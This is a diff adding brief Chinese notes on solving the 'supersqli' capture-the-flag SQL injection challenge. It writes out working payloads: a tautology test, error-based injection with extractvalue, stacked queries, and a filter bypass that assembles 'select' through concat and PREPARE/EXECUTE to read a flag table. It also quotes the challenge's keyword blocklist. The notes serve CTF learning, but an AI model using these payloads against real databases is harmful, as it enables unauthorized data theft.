@@ -1,0 +1,19 @@
+1'or 1=1#注入成功
+使用select  return  preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+
+使用报错注入
+1' and extractvalue(1,concat('~',database()))#
+爆出数据库名
+
+堆叠注入查出表名
+-1';use supersqli;show tables;#
+
+用show查出字段名
+拼接sql语句，绕过sql关键字检测得到flag
+-1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
+
+Notes:
+1、set 语句为已存在的变量赋值，PREPARE创建SQL语句，EXECUTE执行SQL语句。
+2、sql中有一些保留字，当你的字段名是它的保留字时，这个时候sql语句的字段不加``就会报错。
+
+https://blog.csdn.net/qq_43818615/article/details/104485484
